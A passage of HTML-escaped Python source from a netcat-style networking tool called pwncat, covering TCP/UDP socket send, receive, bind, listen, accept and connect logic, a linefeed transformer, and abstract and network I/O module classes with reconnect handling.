                    # to send data to the client, we need to quit here, otherwise
                    # it blocks the shutdown routine.
                    if self.__ssig.has_stop():
                        return 0
                    time.sleep(0.1)  # Less wastefull than using &#39;pass&#39;
                # First time a UDP client connects to the server (display it on the server)
                self.__log.info(
                    &#34;Client connected from %s:%d&#34;, self.__remote_addr, self.__remote_port
                )

        curr = 0  # bytes send during one loop iteration
        send = 0  # total bytes send
        size = len(data)  # bytes of data that needs to be send
        byte = self.__enc.encode(data)
        assert size == len(byte), &#34;Encoding messed up string length, might need to do len() after.&#34;

        # Loop until all bytes have been send
        while send &lt; size:
            try:
                self.__log.debug(
                    &#34;Trying to send %d bytes to %s:%d&#34;,
                    size - send,
                    self.__remote_addr,
                    self.__remote_port,
                )
                self.__log.trace(&#34;Trying to send: %s&#34;, repr(byte))  # type: ignore
                if self.__options.udp:
                    curr = self.__conn.sendto(byte, (self.__remote_addr, self.__remote_port))
                    send += curr
                else:
                    curr = self.__conn.send(byte)
                    send += curr
                if curr == 0:
                    self.__log.error(&#34;No bytes send during loop round.&#34;)
                    return 0
                # Remove &#39;curr&#39; many bytes from byte for the next round
                byte = byte[curr:]
                self.__log.debug(
                    &#34;Sent %d bytes to %s:%d (%d bytes remaining)&#34;,
                    curr,
                    self.__remote_addr,
                    self.__remote_port,
                    size - send,
                )
            except (OSError, socket.error) as error:
                self.__log.error(&#34;Socket OS Error: %s&#34;, error)
                return send
        return send

    def receive(self):
        # type: () -&gt; str
        &#34;&#34;&#34;Receive and return data from the connected socket.

        Returns:
            str: Returns received data from connected socket.

        Raises:
            socket.timeout: Except here to do an action when the socket is not busy.
            AttributeError: Except here when current instance has closed itself (Ctrl+c).
            socket.error:   Except here when unconnected or connection was forcibly closed.
            EOFError:       Except here when upstream has closed the connection.
        &#34;&#34;&#34;
        try:
            # https://manpages.debian.org/buster/manpages-dev/recv.2.en.html
            (byte, addr) = self.__conn.recvfrom(self.__options.bufsize)

        # [1/5] Non-blocking socket if socket.settimeout() is set
        # NOTE: This is the place where we can do any checks in between reads as the
        # socket has been changed from blocking to time-out based.
        # NOTE: This is also the place, where we quit in case we want to.
        except socket.timeout as error:
            raise socket.timeout(error)  # type: ignore

        # [2/5] When closing itself (e.g.: via Ctrl+c and the socket_close() funcs are called)
        except AttributeError:
            msg = &#34;Connection was closed by self.&#34;
            self.__log.warning(msg)
            raise AttributeError(msg)

        # [3/5] Connection was forcibly closed
        # [Errno 107] Transport endpoint is not connected
        # [Errno 10054] An existing connection was forcibly closed by the remote host
        # [WinError 10054] An existing connection was forcibly closed by the remote host
        except (OSError, socket.error) as error:
            self.__log.warning(&#34;Connection error: %s&#34;, error)
            raise socket.error(error)

        # If we&#39;re receiving data from a UDP client
        # we can firstly/finally set its addr/port in order
        # to send data back to it (see send() function)
        if self.__options.udp:
            self.__remote_addr = addr[0]
            self.__remote_port = addr[1]
            self.__log.debug(&#34;Client connected: %s:%d&#34;, self.__remote_addr, self.__remote_port)

        # [4/5] Upstream (server or client) is gone.
        # In TCP, there is no such thing as an empty message, so zero means a peer disconnect.
        # In UDP, there is no such thing as a peer disconnect, so zero means an empty datagram.
        if not byte:
            msg = &#34;Upstream has closed the connection.&#34;
            self.__log.info(msg)
            raise EOFError(msg)

        # [5/5] We have data to process
        data = self.__enc.decode(byte)
        self.__log.debug(
            &#34;Received %d bytes from %s:%d&#34;, len(data), self.__remote_addr, self.__remote_port
        )
        self.__log.trace(&#34;Received: %s&#34;, repr(data))  # type: ignore
        return data

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def gethostbyname(self, host, port):
        # type: (Optional[str], int) -&gt; str
        &#34;&#34;&#34;Translate hostname into IP address.

        Args:
            host (str): The hostname to resolvea.
            port (int): The port of the hostname to resolve.

        Returns:
            str: Numeric IP address.

        Raises:
            socket.gaierror: If hostname cannot be resolved.
        &#34;&#34;&#34;
        family = socket.AF_INET6 if self.__options.ipv6 else socket.AF_INET
        socktype = socket.SOCK_DGRAM if self.__options.udp else socket.SOCK_STREAM
        proto = socket.SOL_UDP if self.__options.udp else socket.SOL_TCP
        flags = 0

        # Quickly do wildcards for listening addresses
        if host is None:
            if family == socket.AF_INET:
                self.__log.debug(&#34;Resolving hostname not required, using wildcard: 0.0.0.0&#34;)
                return &#34;0.0.0.0&#34;
            if family == socket.AF_INET6:
                self.__log.debug(&#34;Resolving hostname not required, using wildcard: ::&#34;)
                return &#34;::&#34;

        if self.__options.nodns:
            flags = socket.AI_NUMERICHOST
        try:
            self.__log.debug(&#34;Resolving hostname: %s&#34;, host)
            infos = socket.getaddrinfo(host, port, family, socktype, proto, flags)
            addr = str(infos[0][4][0])
        except (AttributeError, socket.gaierror) as error:
            self.__log.error(&#34;Resolve Error: %s&#34;, error)
            raise socket.gaierror(error)  # type: ignore
        self.__log.debug(&#34;Resolved hostname: %s&#34;, addr)
        return addr

    def run_client(self, addr, port):
        # type: (str, int) -&gt; bool
        &#34;&#34;&#34;Run and create a TCP or UDP client and connect to a remote peer.

        Args:
            addr (str): Numeric IP address to connect to (ensure to resolve a hostname beforehand).
            port (int): Port of the server to connect to.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        &#34;&#34;&#34;
        # [1/4] Create socket
        try:
            conn = self.__create_socket()
        except socket.error:
            return False

        # [2/4] Store socket in instance
        self.__conn = conn

        # [3/4] Set current receive timeout for socket to make it non-blocking
        self.__settimeout(self.__conn)

        # [UDP 4/4]
        if self.__options.udp:
            # UDP does not have a &#34;connect&#34; feature as it is a stateless protocol.
            # So in order for the send() function to ne the remote address,
            # we must explicitly set it here.
            # (For TCP, this is done in __connect()
            self.__remote_addr = addr
            self.__remote_port = port
            self.__print_socket_opts(self.__conn, &#34;conn-sock&#34;)
            return True

        # [TCP 4/4] connect
        try:
            self.__connect(self.__conn, addr, port)
        except socket.error:
            self.__close(&#34;conn&#34;, self.__conn)
            return False

        self.__print_socket_opts(self.__conn, &#34;conn-sock&#34;)
        return True

    def run_server(self, addr, port):
        # type: (str, int) -&gt; bool
        # TODO: Integrate: --rebind(-wait|-robin)
        &#34;&#34;&#34;Run and create a TCP or UDP listening server and wait for a client to connect.

        Args:
            addr (str): Numeric IP address to bind to (ensure to resolve a hostname beforehand).
            port (int): Port of the address to bind to.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        &#34;&#34;&#34;
        # [1/4] Create socket
        try:
            sock = self.__create_socket()
        except socket.error:
            return False

        # [2/4] Bind socket
        if not self.__bind(sock, addr, port):
            self.__close(&#34;sock&#34;, sock)
            return False

        family = socket.AF_INET6 if self.__options.ipv6 else socket.AF_INET

        # [UDP 3/4] There is no listen or accept for UDP
        if self.__options.udp:
            self.__conn = sock
            self.__log.info(&#34;Listening on %s (family %d/UDP, port %d)&#34;, addr, family, port)

        # [TCP 3/4] Requires listen and accept
        else:
            # Listen
            if not self.__listen(sock):
                self.__close(&#34;sock&#34;, sock)
                return False
            self.__log.info(&#34;Listening on %s (family %d/TCP, port %d)&#34;, addr, family, port)
            self.__print_socket_opts(sock, &#34;bind-sock&#34;)
            # Accept
            try:
                conn = self.__accept(sock)
            except socket.error:
                self.__close(&#34;sock&#34;, sock)
                return False
            self.__sock = sock
            self.__conn = conn

        # [4/4] Set current receive timeout for socket to make it non-blocking
        self.__settimeout(self.__conn)
        self.__print_socket_opts(self.__conn, &#34;conn-sock&#34;)
        return True

    def re_accept_client(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Re-accept new clients, if connection is somehow closed or accept did not work.

        Returns:
            bool: Returns `True` on success and `False` and error.
        &#34;&#34;&#34;
        # [1/3] Close conn socket
        self.close_conn_sock()

        # [2/3] Accept
        try:
            conn = self.__accept(self.__sock)
        except socket.error:
            return False
        self.__conn = conn
        # [3/3] Set current receive timeout for socket to make it non-blocking
        self.__settimeout(self.__conn)
        return True

    def close_bind_sock(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Close the bind socket used by the server to accept clients.&#34;&#34;&#34;
        try:
            self.__close(&#34;sock&#34;, self.__sock)
        except AttributeError:
            # Socket does not exist (anymore)
            pass

    def close_conn_sock(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Close the communication socket used for send and receive.&#34;&#34;&#34;
        try:
            self.__close(&#34;conn&#34;, self.__conn)
        except AttributeError:
            # Socket does not exist (anymore)
            pass

    # --------------------------------------------------------------------------
    # Private Functions (general)
    # --------------------------------------------------------------------------
    def __print_socket_opts(self, sock, log_prefix=&#34;Socket&#34;):
        # type: (socket.socket, str) -&gt; None
        &#34;&#34;&#34;Debug logs configured socket options.&#34;&#34;&#34;
        # https://hg.python.org/cpython/file/3.5/Modules/socketmodule.c
        options = {
            &#34;Sock&#34;: [
                &#34;SO_DEBUG&#34;,
                &#34;SO_ACCEPTCONN&#34;,
                &#34;SO_REUSEADDR&#34;,
                &#34;SO_EXCLUSIVEADDRUSE&#34;,
                &#34;SO_KEEPALIVE&#34;,
                &#34;SO_DONTROUTE&#34;,
                &#34;SO_BROADCAST&#34;,
                &#34;SO_USELOOPBACK&#34;,
                &#34;SO_LINGER&#34;,
                &#34;SO_OOBINLINE&#34;,
                &#34;SO_REUSEPORT&#34;,
                &#34;SO_SNDBUF&#34;,
                &#34;SO_RCVBUF&#34;,
                &#34;SO_SNDLOWAT&#34;,
                &#34;SO_RCVLOWAT&#34;,
                &#34;SO_SNDTIMEO&#34;,
                &#34;SO_RCVTIMEO&#34;,
                &#34;SO_ERROR&#34;,
                &#34;SO_TYPE&#34;,
                &#34;SO_SETFIB&#34;,
                &#34;SO_PASSCRED&#34;,
                &#34;SO_PEERCRED&#34;,
                &#34;LOCAL_PEERCRED&#34;,
                &#34;SO_BINDTODEVICE&#34;,
                &#34;SO_PRIORITY&#34;,
                &#34;SO_MARK&#34;,
            ],
            &#34;IPv4&#34;: [
                &#34;IP_OPTIONS&#34;,
                &#34;IP_HDRINCL&#34;,
                &#34;IP_TOS&#34;,
                &#34;IP_TTL&#34;,
                &#34;IP_RECVOPTS&#34;,
                &#34;IP_RECVRETOPTS&#34;,
                &#34;IP_RECVDSTADDR&#34;,
                &#34;IP_RETOPTS&#34;,
                &#34;IP_MULTICAST_IF&#34;,
                &#34;IP_MULTICAST_TTL&#34;,
                &#34;IP_MULTICAST_LOOP&#34;,
                &#34;IP_ADD_MEMBERSHIP&#34;,
                &#34;IP_DROP_MEMBERSHIP&#34;,
                &#34;IP_DEFAULT_MULTICAST_TTL&#34;,
                &#34;IP_DEFAULT_MULTICAST_LOOP&#34;,
                &#34;IP_MAX_MEMBERSHIPS&#34;,
                &#34;IP_TRANSPARENT&#34;,
            ],
            &#34;IPv6&#34;: [
                &#34;IPV6_JOIN_GROUP&#34;,
                &#34;IPV6_LEAVE_GROUP&#34;,
                &#34;IPV6_MULTICAST_HOPS&#34;,
                &#34;IPV6_MULTICAST_IF&#34;,
                &#34;IPV6_MULTICAST_LOOP&#34;,
                &#34;IPV6_UNICAST_HOPS&#34;,
                &#34;IPV6_V6ONLY&#34;,
                &#34;IPV6_CHECKSUM&#34;,
                &#34;IPV6_DONTFRAG&#34;,
                &#34;IPV6_DSTOPTS&#34;,
                &#34;IPV6_HOPLIMIT&#34;,
                &#34;IPV6_HOPOPTS&#34;,
                &#34;IPV6_NEXTHOP&#34;,
                &#34;IPV6_PATHMTU&#34;,
                &#34;IPV6_PKTINFO&#34;,
                &#34;IPV6_RECVDSTOPTS&#34;,
                &#34;IPV6_RECVHOPLIMIT&#34;,
                &#34;IPV6_RECVHOPOPTS&#34;,
                &#34;IPV6_RECVPKTINFO&#34;,
                &#34;IPV6_RECVRTHDR&#34;,
                &#34;IPV6_RECVTCLASS&#34;,
                &#34;IPV6_RTHDR&#34;,
                &#34;IPV6_RTHDRDSTOPTS&#34;,
                &#34;IPV6_RTHDR_TYPE_0&#34;,
                &#34;IPV6_RECVPATHMTU&#34;,
                &#34;IPV6_TCLASS&#34;,
                &#34;IPV6_USE_MIN_MTU&#34;,
            ],
            &#34;TCP&#34;: [
                &#34;TCP_NODELAY&#34;,
                &#34;TCP_MAXSEG&#34;,
                &#34;TCP_CORK&#34;,
                &#34;TCP_KEEPIDLE&#34;,
                &#34;TCP_KEEPINTVL&#34;,
                &#34;TCP_KEEPCNT&#34;,
                &#34;TCP_SYNCNT&#34;,
                &#34;TCP_LINGER2&#34;,
                &#34;TCP_DEFER_ACCEPT&#34;,
                &#34;TCP_WINDOW_CLAMP&#34;,
                &#34;TCP_INFO&#34;,
                &#34;TCP_QUICKACK&#34;,
                &#34;TCP_FASTOPEN&#34;,
            ],
        }
        for proto, optnames in options.items():
            if self.__options.info == &#34;all&#34; or proto.lower() == self.__options.info:
                for optname in optnames:
                    if proto.lower() == &#34;sock&#34;:
                        level = socket.SOL_SOCKET
                    elif proto.lower() == &#34;ipv4&#34;:
                        level = socket.IPPROTO_IP
                    elif proto.lower() == &#34;ipv6&#34;:
                        level = socket.IPPROTO_IPV6
                    elif proto.lower() == &#34;tcp&#34;:
                        level = socket.IPPROTO_TCP
                    try:
                        self.__log.info(
                            &#34;[%s] %s: %s: %s&#34;,
                            log_prefix,
                            proto,
                            optname,
                            sock.getsockopt(
                                level, eval(&#34;socket.&#34; + optname)  # pylint: disable=eval-used
                            ),
                        )
                    except AttributeError:
                        pass
                    except (OSError, socket.error):
                        pass

    def __create_socket(self):
        # type: () -&gt; socket.socket
        &#34;&#34;&#34;Create TCP or UDP socket.

        Returns:
            socket.socket: Returns TCP or UDP socket.

        Raises:
            socket.error: If socket cannot be created.
        &#34;&#34;&#34;
        family_sock = socket.AF_INET6 if self.__options.ipv6 else socket.AF_INET
        family_name = &#34;IPv6&#34; if self.__options.ipv6 else &#34;IPv4&#34;
        try:
            if self.__options.udp:
                self.__log.debug(&#34;Creating %s UDP socket&#34;, family_name)
                sock = socket.socket(family_sock, socket.SOCK_DGRAM)
            else:
                self.__log.debug(&#34;Creating %s TCP socket&#34;, family_name)
                sock = socket.socket(family_sock, socket.SOCK_STREAM)
        except socket.error as error:
            msg = &#34;Failed to create {} socket: {}&#34;.format(family_name, error)
            self.__log.error(msg)
            raise socket.error(msg)
        # Get around the &#34;[Errno 98] Address already in use&#34; error, if the socket is still in wait
        # we instruct it to reuse the address anyway.
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        if self.__options.ip_tos is not None:
            self.__log.info(&#34;Setting IP_TOS to: %d&#34;, self.IP_TOS[self.__options.ip_tos])
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, self.IP_TOS[self.__options.ip_tos])

        return sock

    def __settimeout(self, sock):
        # type: (socket.socket) -&gt; None
        &#34;&#34;&#34;Set the receive timeout on a socket.

        Args:
            sock (socket.socket): The socket to set the receive timeout for.
        &#34;&#34;&#34;
        self.__log.debug(&#34;Setting sock recv timeout to %f sec&#34;, self.__options.recv_timeout)
        sock.settimeout(self.__options.recv_timeout)

    def __close(self, name, sock):
        # type: (str, socket.socket) -&gt; None
        &#34;&#34;&#34;Shuts down and closes a socket.

        Args:
            name (str): Name of the socket used for logging purposes.
            sock (str): Socket to shutdown and close.
        &#34;&#34;&#34;
        assert name in [&#34;sock&#34;, &#34;conn&#34;]
        try:
            # (SHUT_RD)   0 = Done receiving (disallows receiving)
            # (SHUT_WR)   1 = Done sending (disallows sending)
            # (SHUT_RDWR) 2 = Both
            self.__log.trace(&#34;Shutting down %s socket&#34;, name)  # type: ignore
            sock.shutdown(socket.SHUT_RDWR)
        except (OSError, socket.error) as error:
            self.__log.trace(&#34;Could not shutdown %s socket: %s&#34;, name, error)  # type: ignore

        try:
            self.__log.trace(&#34;Closing %s socket&#34;, name)  # type: ignore
            sock.close()
        except (OSError, socket.error) as error:
            self.__log.trace(&#34;Could not close %s socket: %s&#34;, name, error)  # type: ignore

    # --------------------------------------------------------------------------
    # Private Functions (server)
    # --------------------------------------------------------------------------
    def __bind(self, sock, addr, port):
        # type: (socket.socket, str, int) -&gt; bool
        &#34;&#34;&#34;Bind the socket to an address.

        Args:
            sock (socket.socket): The socket to bind.
            addr (str): The numerical IP address to bind to.
            port (int): The port to bind to.

        Returns:
            bool: Returns `True` on success and `False` on Failure.
        &#34;&#34;&#34;
        try:
            self.__log.debug(&#34;Binding socket to %s:%d&#34;, addr, port)
            sock.bind((addr, port))
            return True
        except (OverflowError, OSError, socket.error) as error:
            self.__log.error(&#34;Binding socket to %s:%d failed: %s&#34;, addr, port, error)
            return False

    def __listen(self, sock):
        # type: (socket.socket) -&gt; bool
        &#34;&#34;&#34;Listen for connections made to the socket.

        Args:
            sock (socket.socket): The socket to listen on.

        Returns:
            bool: Returns `True` on success and `False` on Failure.
        &#34;&#34;&#34;
        try:
            self.__log.debug(&#34;Listening with backlog=%d&#34;, self.__options.backlog)
            sock.listen(self.__options.backlog)
            return True
        except socket.error as error:
            self.__log.error(&#34;Listening failed: %s&#34;, error)
            return False

    def __accept(self, sock):
        # type: (socket.socket) -&gt; socket.socket
        &#34;&#34;&#34;Accept a connection. The socket must be bound to an addr and listening for connections.

        Args:
            sock (socket.socket): The socket to accept on.

        Returns:
            socket.socket: Returns the connection socket.

        Raises:
            socket.error: If the server cannot accept connections on its socket.
        &#34;&#34;&#34;
        try:
            self.__log.debug(&#34;Waiting for TCP client&#34;)
            conn, client = sock.accept()
        except (socket.gaierror, socket.error) as error:
            msg = &#34;Accept failed: {}&#34;.format(error)
            self.__log.error(msg)
            raise socket.error(msg)
        # Store connected remote peer address and port
        self.__remote_addr = client[0]
        self.__remote_port = client[1]
        self.__log.info(&#34;Client connected from %s:%d&#34;, self.__remote_addr, self.__remote_port)
        return conn

    # --------------------------------------------------------------------------
    # Private Functions (client)
    # --------------------------------------------------------------------------
    def __connect(self, sock, addr, port):
        # type: (socket.socket, str, int) -&gt; None
        &#34;&#34;&#34;Connect to a remote socket at given address and port (TCP-only).

        Args:
            sock (socket.socket): The socket to use for connecting.
            addr (str): Numerical IP address of server to connect to.
            port (int): Port of server to connect to.

        Raises:
            socker.error: If client cannot connect to remote peer.
        &#34;&#34;&#34;
        try:
            self.__log.debug(&#34;Connecting to %s:%d&#34;, addr, port)
            sock.connect((addr, port))
        except socket.error as error:
            msg = &#34;Connecting to {}:{} failed: {}&#34;.format(addr, port, error)
            self.__log.error(msg)
            raise socket.error(msg)
        self.__log.info(&#34;Connected to %s:%d&#34;, addr, port)
        # Store connected remote peer address and port
        self.__remote_addr = addr
        self.__remote_port = port


# #################################################################################################
# #################################################################################################
# ###
# ###   4 / 10   T R A N S F O R M E R
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [4/10 TRANSFORM]: (1/2): Transform
# -------------------------------------------------------------------------------------------------
class Transform(ABC):  # type: ignore
    &#34;&#34;&#34;Abstract class to for pwncat I/O transformers.

    This is a skeleton that defines how the transformer for pwncat should look like.
    &#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def log(self):
        # type: () -&gt; logging.Logger
        &#34;&#34;&#34;`TraceLogger`: Logger instance.&#34;&#34;&#34;
        return self.__log

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    @abstractmethod
    def __init__(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Set specific options for this transformer.&#34;&#34;&#34;
        super(Transform, self).__init__()
        self.__log = logging.getLogger(__name__)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    @abstractmethod
    def transform(self, data):
        # type: (str) -&gt; str
        &#34;&#34;&#34;Implement a transformer function which transforms a string..

        Returns:
            str: The transformed string.
        &#34;&#34;&#34;


# -------------------------------------------------------------------------------------------------
# [4/10 TRANSFORM]: (2/2) TransformLinefeed
# -------------------------------------------------------------------------------------------------
class TransformLinefeed(Transform):
    &#34;&#34;&#34;Implement basic linefeed replacement.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, opts):
        # type: (DsTransformLinefeed) -&gt; None
        &#34;&#34;&#34;Set specific options for this transformer.

        Args:
            opts (DsTransformLinefeed): Transformer options.

        &#34;&#34;&#34;
        super(TransformLinefeed, self).__init__()
        self.__opts = opts

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def transform(self, data):
        # type: (str) -&gt; str
        &#34;&#34;&#34;Transform linefeeds to CRLF, LF or CR if requested.

        Returns:
            str: The string with altered linefeeds.
        &#34;&#34;&#34;
        # &#39;auto&#39; keep it as it is
        if self.__opts.crlf is None:
            return data

        # ? -&gt; No line feeds
        if self.__opts.crlf == &#34;no&#34;:
            if data.endswith(&#34;\r\n&#34;):
                self.log.debug(&#34;Removing CRLF&#34;)
                return data[:-2]
            if data.endswith(&#34;\n&#34;):
                self.log.debug(&#34;Removing LF&#34;)
                return data[:-1]
            if data.endswith(&#34;\r&#34;):
                self.log.debug(&#34;Removing CR&#34;)
                return data[:-1]
        # ? -&gt; CRLF
        if self.__opts.crlf == &#34;crlf&#34; and not data.endswith(&#34;\r\n&#34;):
            if data.endswith(&#34;\n&#34;):
                self.log.debug(&#34;Replacing LF with CRLF&#34;)
                return data[:-1] + &#34;\r\n&#34;
            if data.endswith(&#34;\r&#34;):
                self.log.debug(&#34;Replacing CR with CRLF&#34;)
                return data[:-1] + &#34;\r\n&#34;
        # ? -&gt; LF
        if self.__opts.crlf == &#34;lf&#34;:
            if data.endswith(&#34;\r\n&#34;):
                self.log.debug(&#34;Replacing CRLF with LF&#34;)
                return data[:-2] + &#34;\n&#34;
            if data.endswith(&#34;\r&#34;):
                self.log.debug(&#34;Replacing CR with LF&#34;)
                return data[:-1] + &#34;\n&#34;
        # ? -&gt; CR
        if self.__opts.crlf == &#34;cr&#34;:
            if data.endswith(&#34;\r\n&#34;):
                self.log.debug(&#34;Replacing CRLF with CR&#34;)
                return data[:-2] + &#34;\r&#34;
            if data.endswith(&#34;\n&#34;):
                self.log.debug(&#34;Replacing LF with CR&#34;)
                return data[:-1] + &#34;\r&#34;

        # Otherwise just return it as it is
        return data


# #################################################################################################
# #################################################################################################
# ###
# ###   5 / 10   I O   M O D U L E S
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [5/10 IO]: (1/4): IO
# -------------------------------------------------------------------------------------------------
class IO(ABC):  # type: ignore
    &#34;&#34;&#34;Abstract class to for pwncat I/O modules.

    This is a skeleton that defines how the I/O module for pwncat should look like.

    The &#34;producer&#34; should constantly yield data received from some sort of input
    which could be user input, output from a shell command data from a socket.

    The &#34;callback&#34; will apply some sort of action on the data received from a producer
    which could be output to stdout, send it to the shell or to a socket.

    &#34;The &#34;interrupts&#34; are a list of funtions that trigger the producer to stop
    and return to its parent thread/function. The producer must also be implemented
    in a way that it is able to act on the event which the &#34;interrupt&#34; func emitted.
    &#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def ssig(self):
        # type: () -&gt; StopSignal
        &#34;&#34;&#34;`StopSignal`: Read only property to provide a StopSignal instance to IO.&#34;&#34;&#34;
        return self.__ssig

    @property
    def log(self):
        # type: () -&gt; logging.Logger
        &#34;&#34;&#34;`TraceLogger`: Logger instance.&#34;&#34;&#34;
        return self.__log

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    @abstractmethod
    def __init__(self, ssig):
        # type: (StopSignal) -&gt; None
        &#34;&#34;&#34;Set specific options for this IO module.

        Args:
            ssig (StopSignal): StopSignal instance used by the interrupter.
        &#34;&#34;&#34;
        super(IO, self).__init__()
        self.__ssig = ssig
        self.__log = logging.getLogger(__name__)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    @abstractmethod
    def producer(self):
        # type: () -&gt; Iterator[str]
        &#34;&#34;&#34;Implement a generator function which constantly yields data.

        The data could be from various sources such as: received from a socket,
        received from user input, received from shell command output or anything else.

        Yields:
            str: Data generated/produced by this function.
        &#34;&#34;&#34;

    @abstractmethod
    def consumer(self, data):
        # type: (str) -&gt; None
        &#34;&#34;&#34;Define a consumer callback which will apply an action on the producer output.

        Args:
            data (str): Data retrieved from the producer to work on.
        &#34;&#34;&#34;

    @abstractmethod
    def interrupt(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Define an interrupt function which will stop the producer.

        Various producer might call blocking functions and they won&#39;t be able to stop themself
        as they hang on that blocking function.
        NOTE: This method is triggered from outside and is supposed to stop/shutdown the producer.

        You should at least implement it with &#34;self.ssig.raise_stop()&#34;
        &#34;&#34;&#34;


# -------------------------------------------------------------------------------------------------
# [5/10 IONetwork]: (2/4) IONetwork
# -------------------------------------------------------------------------------------------------
class IONetwork(IO):
    &#34;&#34;&#34;Pwncat implementation based on custom Socket library.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(
        self,
        ssig,  # type: StopSignal
        encoder,  # type: StringEncoder
        host,  # type: str
        ports,  # type: List[int]
        role,  # type: str
        srv_opts,  # type: DsIONetworkSrv
        cli_opts,  # type: DsIONetworkCli
        sock_opts,  # type: DsIONetworkSock
    ):
        # type: (...) -&gt; None
        &#34;&#34;&#34;Create a Pwncat instance of either a server or a client.

        Args:
            ssig (StopSignal): Stop signal instance
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            host (str): The hostname to resolve.
            ports ([int]): List of ports to connect to or listen on.
            role (str): Either &#34;server&#34; or &#34;client&#34;.
            srv_opts (DsIONetworkSrv):   Options for the server.
            cli_opts (DsIONetworkCli):   Options for the client.
            sock_opts (DsIONetworkSock): Options to parse back to Sock.
        &#34;&#34;&#34;
        assert role in [&#34;server&#34;, &#34;client&#34;], &#34;The role must be &#39;server&#39; or &#39;client&#39;.&#34;
        super(IONetwork, self).__init__(ssig)

        self.__role = role
        self.__net = Sock(encoder, ssig, sock_opts)
        self.__sock_opts = sock_opts
        self.__srv_opts = srv_opts
        self.__cli_opts = cli_opts

        try:
            addr = self.__net.gethostbyname(host, ports[0])
        except socket.gaierror:
            sys.exit(1)

        # Internally store addresses for reconn or rebind functions
        self.__addr = addr
        self.__ports = ports
        self.__pport = 0  # pointer to the current port

        if role == &#34;server&#34;:
            if not self.__net.run_server(self.__addr, self.__ports[self.__pport]):
                sys.exit(1)
        if role == &#34;client&#34;:
            if not self.__net.run_client(self.__addr, self.__ports[self.__pport]):
                if not self.__client_reconnect_to_server():
                    sys.exit(1)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def producer(self):
        # type: () -&gt; Iterator[str]
        &#34;&#34;&#34;Network receive generator which hooks into the receive function and adds features.

        Yields:
            str: Data received from a connected socket.
        &#34;&#34;&#34;
        # Counter for receive retries once this side of the program
        # shuts down (e.g.: Ctrl+c) as there could be data left on the wire.
        curr_recv_timeout_retry = 0

        # Loop endlessly and yield data back to the caller
        while True:
            # [1/3] Generate data
            try:
                yield self.__net.receive()
            # [2/3] Non-blocking socket is finished receiving data and allows us to do some action
            except socket.timeout:
                # Let&#39;s ask the interrupter() function if we should terminate?
                if not self.ssig.has_stop():
                    continue
                # Stop signal is raied when my own side of the network was closed.
                # Happened most likely that the user pressed Ctrl+c
                # Before quitting, we will check x many times, if there is still
                # data left to receive, before shutting down.
                if curr_recv_timeout_retry &lt; self.__sock_opts.recv_timeout_retry:
                    self.log.trace(  # type: ignore
                        &#34;Final socket read: %d/%d before quitting.&#34;,
                        curr_recv_timeout_retry + 1,
                        self.__sock_opts.recv_timeout_retry,
                    )
                    curr_recv_timeout_retry += 1
                    continue
                # We ware all done reading, shut down
                self.ssig.raise_stop()
                return
            # [3/3] Upstream is gone
            except (EOFError, socket.error):
                # Do we have a stop signal?
                if self.ssig.has_stop():
                    return
                # Do we re-accept new clients?
                if self.__sock_opts.udp:
                    # Always accept new clients or reconnect in UDP mode (its stateless)
                    return
                if self.__role == &#34;server&#34; and self.__server_reaccept_from_client():
                    continue
                if self.__role == &#34;client&#34; and self.__client_reconnect_to_server():
                    continue
                return

    def consumer(self, data):
        # type: (str) -&gt; None
        &#34;&#34;&#34;Send data to a socket.&#34;&#34;&#34;
        self.__net.send(data)

    def interrupt(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Stop function that can be called externally to close this instance.&#34;&#34;&#34;
        self.log.trace(  # type: ignore
            &#34;[IONetwork] socket.close was raised by calling interrupt() externally.&#34;
        )
        self.__net.close_conn_sock()
        self.__net.close_bind_sock()
        # Raise stop signal
        self.ssig.raise_stop()

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __client_reconnect_to_server(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Ensure the client re-connects to the remote server, if the remote server hang up.

        Returns:
            bool: Returns `True` on success and `False` on failure or stop signal requested.
        &#34;&#34;&#34;
        assert not self.__sock_opts.udp, &#34;This should have been caught during arg check.&#34;
        assert self.__role == &#34;client&#34;, &#34;This should have been caught during arg check.&#34;

        # reconn &lt; 0 (endlessly)
        # reconn &gt; 0 (reconnect until counter reaches zero)
        while self.__cli_opts.reconn != 0:

            # [1/6] Let&#39;s ask the interrupter() function if we should terminate?
            # We need a little wait here in order for the stop signal to propagate.
            # Don&#39;t know how fast the other threads are.
            # time.sleep(0.1)
            # if self.ssig.has_stop():
            #     return False

            # [2/6] Wait
            time.sleep(self.__cli_opts.reconn_wait)

            # [3/6] Let&#39;s ask the interrupter() function if we should terminate?
            # In case the other threads were slower as the sleep time in [1/5]
            # we will check again here.
            if self.ssig.has_stop():
                return False

            # [4/6] Increment the port numer (if --reconn-robin has multiple)
            self.__pport += 1
            if self.__pport == len(self.__ports):
                self.__pport = 0

